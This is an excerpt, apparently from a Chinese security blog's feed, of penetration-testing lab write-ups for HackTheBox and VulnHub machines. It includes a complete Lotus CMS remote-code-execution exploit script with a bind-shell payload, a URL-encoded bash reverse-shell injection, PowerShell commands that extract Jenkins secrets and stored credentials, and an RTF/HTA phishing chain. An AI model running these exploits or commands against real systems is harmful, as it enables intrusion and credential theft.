&lt;p&gt;记录一下，这里利用较为复杂：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE18acfef783a02105d50f29b7627cc67eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;选第一个就行，Freestyle&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE341076286b10660bc98b9d81712b8c3fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd24048db8c3264b0df9274339bd7d30fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE9d8b32a4cb933cf5a8507940245f2aa7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd6fb38b188e5c54e893655c43ea7a214image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;最后就可以发现cxk2创建好了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5989113e37e3e91230705d5e9706515fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;获取一个token:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE292e7d59d2112195f79b429607e33003image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;添加一个项目：&lt;/p&gt;
&lt;p&gt;curl &lt;a href=&#34;http://cxk:111925c1dec8a58ad68b891d2c47ce010d@object.htb:8080/job/cxk2/build?token=cxk&#34;&gt;http://cxk:111925c1dec8a58ad68b891d2c47ce010d@object.htb:8080/job/cxk2/build?token=cxk&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf4ddae0037f9c4e6abf55c49acb44dafimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;然后点进去就可以看到输出了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE75afbb54e1a84516be5f44eb8ae040d7image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接下里就是命令执行：&lt;/p&gt;
&lt;p&gt;失败了，好像是说网络错误：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb3cbf0a230caceaa0e8e7e2ffc70e134image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里涉及知识盲区：&lt;/p&gt;
&lt;p&gt;jenkins的用户信息存放位置：&lt;/p&gt;
&lt;p&gt;c:\Users\oliver\Appdata\local\jenkins.jenkins\users&lt;/p&gt;
&lt;p&gt;然后可以看到admin用户的文件夹：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE62acc9d58da7e28c97ddba278c03bccaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;读取里面的config.xml文件：&lt;/p&gt;
&lt;p&gt;就可以看到加密的密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5894a52362dc6d332dfc3bc3c0a7a3cbimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;详情可以参见：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/hoto/jenkins-credentials-decryptor&#34;&gt;https://github.com/hoto/jenkins-credentials-decryptor&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上面那个文件，其实是&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcf27eed06a4e20c411325bb133328d47image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;master.key:&lt;/p&gt;
&lt;p&gt;f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc05251d5c94adab59ea51a062aa689ccimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;hudson.util.Secret是二进制文件，使用base64读取出来：&lt;/p&gt;
&lt;p&gt;powershell.exe -c &amp;ldquo;$c=[convert]::ToBase64String((Get-Content -path &amp;lsquo;c:\Users\oliver\Appdata\local\jenkins.jenkins\secrets\hudson.util.Secret&amp;rsquo; -Encoding byte));Write-Output $c&amp;rdquo;&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x019 Typhoon 1.02</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x019-typhoon-1.02/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x019-typhoon-1.02/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEacdbbff87e00e3b1e7c2b593bc9fdd39%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这次扫描结果太多了，就不看服务扫描结果了，打眼一看全是高危端口&lt;/p&gt;
&lt;h1 id=&#34;渗透&#34;&gt;渗透&lt;/h1&gt;
&lt;p&gt;21端口：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE1fd2eed0df441ab4c9b5033195fe119c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;80端口 lotuscms成功getshell，应该还有其他洞，感觉洞很多的样子：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# -*- coding: utf-8 -*-
#!/usr/bin/python

import socket
import sys
import time
import os
import base64
import urllib

if len(sys.argv) &amp;lt;= 2:
        print &amp;#34;\n      EXPLOIT - BIND SHELL\n&amp;#34;
        print &amp;#34;   - Remote Command Execution -&amp;#34;
        print &amp;#34;     tested on: Lotus CMS 3.0\n&amp;#34;
        print &amp;#34; Usage:&amp;#34;
        print &amp;#34; ./&amp;#34;+sys.argv[0]+&amp;#34; [TARGET IP] [TCP PORT TO OPEN]&amp;#34;
        print &amp;#34; Example:&amp;#34;
        print &amp;#34; ./&amp;#34;+sys.argv[0]+&amp;#34; 192.168.10.106 4444&amp;#34;
else:
        print &amp;#34;\n      EXPLOIT - BIND SHELL\n&amp;#34;
        print &amp;#34;   - Remote Command Execution -&amp;#34;
        print &amp;#34;     tested on: Lotus CMS 3.0\n&amp;#34;
        print &amp;#34; [*] Generating payload...&amp;#34;

        # Monta o payload
        payload0=&amp;#34;perl -MIO -e &amp;#39;$p=fork();exit,if$p;$c=new IO::Socket::INET(LocalPort,&amp;#34;+sys.argv[2]+&amp;#34;,Reuse,1,Listen)-&amp;gt;accept;$~-&amp;gt;fdopen($c,w);STDIN-&amp;gt;fdopen($c,r);system$_ while&amp;lt;&amp;gt;&amp;#39;&amp;#34;
        # Encoda em base64
        payload1 = base64.b64encode(payload0)
        # Junta tudo
        payload2=&amp;#34;index&amp;#39;);system(base64_decode(&amp;#39;&amp;#34;+payload1+&amp;#34;&amp;#39;));#&amp;#34;
        # Encoda URL
        data=&amp;#34;page=&amp;#34;+urllib.quote(payload2)
        # Calcula o tamanho do payload
        tam = len(data)

        # Monta header + body do request
        request=&amp;#34;POST /cms/index.php HTTP/1.1\r\n&amp;#34;
        request+=&amp;#34;Host: &amp;#34;+sys.argv[1]+&amp;#34;\r\n&amp;#34;
        request+=&amp;#34;User-Agent: Mozilla/5.0\r\n&amp;#34;
        request+=&amp;#34;Content-Type: application/x-www-form-urlencoded\r\n&amp;#34;
        request+=&amp;#34;Content-Length: &amp;#34;+str(tam)+&amp;#34;\r\n&amp;#34;
        request+=&amp;#34;Connection: close\r\n&amp;#34;
        request+=&amp;#34;\r\n&amp;#34;
        request+=str(data)

        # Envia o request
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((sys.argv[1],80))
        s.send(request)

        # Exibe o que enviou
        print &amp;#34;\n [*] &amp;#34;+str(len(request))+&amp;#34; bytes sent...&amp;#34;
        print &amp;#34; [*] Getting bind connection...\n&amp;#34;

        # Conecta
        time.sleep(2)
        os.system(&amp;#34;nc -vn &amp;#34;+sys.argv[1]+&amp;#34; &amp;#34;+sys.argv[2])
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEf0363f514b3370f3c733d384c145ed7d%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x020 Bulldog 1 </title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x020-bulldog-1-/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x020-bulldog-1-/</guid>
      <description>&lt;p&gt;开机改网卡&lt;/p&gt;
&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEb1af1bfc04642d04a8b1255a7ea5659c%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE75ec00e2e54007ea720d139649796fcb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;web渗透&#34;&gt;WEB渗透&lt;/h1&gt;
&lt;p&gt;8080和80端口一样的&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEd72212dbd9082666b98fc4bcb6e0b4b7%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发现隐藏信息，疑似账号密码：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE8ad0d9336fe075a36686c5a354658e3a%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;hashcat跑半天，破解hash还是建议使用在线的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE562c0da80a75385e3bbb3d23bed601b8%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;破解出的密码如下：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://nick@bulldogindustries.com&#34;&gt;nick@bulldogindustries.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;bulldog&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;mailto:sarah@bulldogindustries.com&#34;&gt;sarah@bulldogindustries.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;bulldoglover&lt;/p&gt;
&lt;p&gt;登录后，成功进去webhell&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEe7be29680457b2caa0f774bf4c6e33eb%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;阻止危险shell，那我想的就是绕过了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEfe337efad31bbc4536cbdf3a0992fd37%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;记得url编码：&lt;/p&gt;
&lt;p&gt;ls|%62%61%73%68%20%2d%63%20%27%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%30%2e%31%32%38%2f%38%38%38%38%20%30%3e%26%31%27&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE35e0246221e6ebaeff9170af631b425b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE43f2f829706792a67ebeda8cd680cfef%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;没什么好说的，前面靶场遇到过的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE158237df7ed2eb7c97cfdc7558d8355f%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X020 Reel</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x020-reel/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x020-reel/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb5ad5902eaed1cba670f021c3c57b41eimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf16cd19536cd0d56229a8932c3f7ae8dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE507c1c6553aaf03d2f202216cec5e25aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的服务：ftp\ssh\smb&lt;/p&gt;
&lt;p&gt;先看ftp:&lt;/p&gt;
&lt;p&gt;有匿名登录，发现信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEc1d9c2f6a55ae6070924f9978eb027a4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;里面的信息大致理解为：&lt;/p&gt;
&lt;p&gt;有程序回记录hash，然后上传到documents下的文件将会被查看，然后是操作记录？&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEebd586d457654b21f2bce6d856aaa0c4image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接着看smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3c6f18499bb0b6b6ee076a6daddc9565image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;ssh目前没有其他信息，就不查看了，研究一下上面写的rtf格式的文件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0a2bca99e6897513ee294a0de8e21d5dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;了解了一下，RTF格式的文档也能调用宏来进行攻击：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/bhdresh/CVE-2017-0199&#34;&gt;https://github.com/bhdresh/CVE-2017-0199&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd90abd08c5b1adac77be6fdef6f6c4b6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;这里的意思是，可以让rtf格式的文档来下载HTA文件执行，hta再进行上线，然后发现前面理解好像有些问题&lt;/p&gt;
&lt;p&gt;FTP并没有上传权限：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE0ea5c66efa52b80eaf7d75214eb43870image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;呐意思其实是向文件创建人的邮箱发信息：&lt;/p&gt;
&lt;p&gt;因为25端口开放的：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6b042694b831f21a63b58fce782e675dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;配置Empire，生成hta：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcde94f4bf5107a8e9e9dec93509e6fd9image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发送邮件：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa71e39f5b5e4387ed9f3b6c3049c4a7cimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcc8fd18eea6201ec71b8dc75fd4e841fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;成功反弹shell:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEba70200d15c647d2d6da1052cfa5eba8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;别的不谈，这玩意儿，延迟是真的高：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE432ff945dd6abe46fc753eea5f84b0a2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;当前在域内：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEe3dbfd5a3293d8e8d09af062bd6158f6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;上bloodhound把：&lt;/p&gt;
&lt;p&gt;不让用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE7cdb5207d45b80cf3fd62f35c794318fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;继续信息收集，桌面上有一个cred.xml文件&lt;/p&gt;
&lt;p&gt;该文件是 PSCredential 对象当中&lt;/p&gt;
&lt;p&gt;可以通过powershell恢复：&lt;/p&gt;
&lt;p&gt;$credential = import-clixml -path c:\Users\nico\Desktop\cred.xml;$credential.GetNetworkCredential().username;$credential.GetNetworkCredential().password&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE34d94a35113dc09d309109c4c45ac6a2image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;成功获取到了用户名密码：&lt;/p&gt;</description>
    </item>
    <item>
      <title>0x021 BNE0x03-Simple</title>
      <link>https://yangzhuzai.github.io/posts/vulnhub/0x021-bne0x03-simple/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/vulnhub/0x021-bne0x03-simple/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;忘了截图，扫完只开了80端口&lt;/p&gt;
&lt;h1 id=&#34;getshell&#34;&gt;getshell&lt;/h1&gt;
&lt;p&gt;文件上传&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCE54e65f7dee2516e8b4c03ce7d0e1b6f1%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa08866e4af08da14a20aa3db3bb6bd4e%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
&lt;p&gt;发现users.txt&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEeb8dec7176e3e59d6d5f048fed7e0557%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有GCC，算了，不找了，内核提权吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/vulnhub_img/WEBRESOURCEa9a83bf1f4c0aaa7753b66370b7e3a10%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;</description>
    </item>
    <item>
      <title>0X021 Search</title>
      <link>https://yangzhuzai.github.io/posts/htb/0x021-search/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>https://yangzhuzai.github.io/posts/htb/0x021-search/</guid>
      <description>&lt;h1 id=&#34;端口扫描&#34;&gt;端口扫描&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbcc7bd75966846206fcbb8e9fed7e937image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf8d179bcc8a0b24c3c2da0380dc7d5a6image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE19e74db1c6e96895df83a9c994f2512aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEcdc1b87c9c82b1e12d33f29819ca7d81image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;获取立足点&#34;&gt;获取立足点&lt;/h1&gt;
&lt;p&gt;值得关注的服务:http、LDAP、smb：&lt;/p&gt;
&lt;p&gt;先看smb:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEf6ced49653d9791722037b9723f60c4dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;接着看ldap：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEa9a646175e1e6421dceb8f62aacaf44aimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;剩下的就只有http了，重点关注：用户名与密码，漏洞&lt;/p&gt;
&lt;p&gt;about us是重灾区：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE667dba0de9f8977eabc2c07ee0f2f2daimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEd7407382aa354570fdc5406c9f1e8121image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;暂且这样吧：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEb379e193d6d14f258b02a54ef5ca0741image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;用户名枚举：&lt;/p&gt;
&lt;p&gt;枚举失败了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCEbbcf140df7fd8c265b82e1cc28ee5508image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是dirsearch发现了东西：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE8899e2a6a81205dbe6090d87204e596fimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE658829953b871cb4dedf12e5da750154image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;但是好像没什么用：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE6f7a492420ebd6b8ac06cef394abb7aaimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;峰回路转：&lt;/p&gt;
&lt;p&gt;cewl收集的字典发现信息：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE22841233ed8649a2b798726adbca825bimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;有了用户名，尝试AS-REP Roasting：&lt;/p&gt;
&lt;p&gt;失败了&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE37aa5438b09281904842ad07bd4f11faimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;只能尝试密码爆破了：&lt;/p&gt;
&lt;p&gt;但是获取策略失败了，也只能试试了：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE5c3197bfdfba3aa3a66835cac92423a8image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;密码爆破失败：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE44a01eb2596f5de56af7c1fa3f424798image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;服了，很好，手写体的英语，里面说了密码和用户名：&lt;/p&gt;
&lt;p&gt;发送密码给Hope sharp&lt;/p&gt;
&lt;p&gt;IsolationIsKey?&lt;/p&gt;
&lt;p&gt;哦，这对我的视力和英语都是一个挑战：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE58812f51dcbc62b315a6a4c3294cb435image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;很好，名字的组合也是一个问题：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://yangzhuzai.github.io/htb_img/WEBRESOURCE3fdb5186c8772f8a4a045478322878e0image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;提权&#34;&gt;提权&lt;/h1&gt;
